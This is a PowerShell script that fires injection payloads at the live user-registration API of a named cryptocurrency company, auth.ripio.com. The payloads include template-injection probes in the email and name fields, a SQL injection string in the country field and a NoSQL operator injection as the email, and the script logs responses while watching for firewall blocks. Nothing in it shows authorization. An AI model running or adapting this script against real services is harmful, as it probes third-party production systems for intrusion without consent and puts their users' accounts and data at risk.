# Test registration endpoint for injection vulnerabilities

$baseUrl = "https://auth.ripio.com/api/v2/authentication/register/"

# SSTI payloads
$payloads = @(
    @{
        name = "Normal"
        body = '{"email":"normaltest123@gmail.com","password":"Test123456!","country":"AR","terms":true}'
    },
    @{
        name = "SSTI in email"
        body = '{"email":"{{7*7}}test@gmail.com","password":"Test123456!","country":"AR","terms":true}'
    },
    @{
        name = "SSTI in name"
        body = '{"email":"test999@gmail.com","password":"Test123456!","country":"AR","terms":true,"first_name":"{{7*7}}"}'
    },
    @{
        name = "SQLi in country"  
        body = '{"email":"test998@gmail.com","password":"Test123456!","country":"AR'' OR ''1''=''1","terms":true}'
    },
    @{
        name = "NoSQL injection"
        body = '{"email":{"$gt":""},"password":"Test123456!","country":"AR","terms":true}'
    }
)

foreach ($test in $payloads) {
    Write-Host "`n=== Testing: $($test.name) ===" -ForegroundColor Yellow
    try {
        $response = Invoke-RestMethod -Uri $baseUrl -Method POST -Body $test.body -ContentType "application/json" -ErrorAction Stop
        Write-Host "SUCCESS:" -ForegroundColor Green
        $response | ConvertTo-Json -Depth 3
    } catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        Write-Host "Error $statusCode" -ForegroundColor Red
        try {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $errorBody = $reader.ReadToEnd()
            if ($errorBody.Length -lt 500) {
                Write-Host $errorBody
            } else {
                Write-Host "Response too long (WAF block likely)"
            }
        } catch {
            Write-Host "Could not read error response"
        }
    }
}
